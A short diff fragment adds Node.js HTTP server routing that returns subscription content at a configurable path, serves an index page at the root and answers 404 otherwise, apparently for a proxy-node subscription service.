+        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
+        res.end(fileContent);
+      } catch (err) {
+        res.writeHead(503, { 'Content-Type': 'text/plain; charset=utf-8' });
+        res.end('Subscription content not yet available, please try again later.');
+      }
+    }
+    return;
+  }
+
+  // 根路由: /
+  if (urlPath === '/') {
+    try {
+      const filePath = path.join(__dirname, 'index.html');
+      const data = await fs.promises.readFile(filePath, 'utf8');
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      res.end(data);
+    } catch (err) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      res.end("Hello world!<br><br>You can access /{SUB_PATH}(Default: /sub) to get your nodes!");
+    }
+    return;
+  }
+
+  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
+  res.end('Not Found');
+});
+
+server.listen(PORT, () => alwaysLog(`http server is running on ${PORT}!`));
